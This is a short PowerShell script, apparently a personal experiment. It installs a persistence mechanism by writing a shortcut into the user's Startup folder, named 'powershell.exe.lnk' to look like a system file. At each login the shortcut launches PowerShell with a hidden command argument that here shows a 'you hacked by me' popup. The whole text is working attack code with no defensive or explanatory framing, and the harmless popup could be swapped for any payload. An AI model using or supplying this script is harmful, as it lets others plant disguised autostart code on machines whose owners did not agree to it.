$SourceFileLocation = $env:SystemRoot + '\System32\WindowsPowerShell\v1.0\powershell.exe'
$SourceCommand = @'
-Command "$wsh = New-Object -ComObject Wscript.Shell; $wsh.Popup('you hacked by me');"
'@

# $ShortcutLocation = 'C:\Users\miny7\Desktop\powershell_test.lnk'
$ShortcutLocation = $env:APPDATA + '\Microsoft\Windows\Start Menu\Programs\Startup\powershell.exe.lnk'

$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut($ShortcutLocation)

$Shortcut.TargetPath = $SourceFileLocation
$Shortcut.Arguments = $SourceCommand
$Shortcut.Save()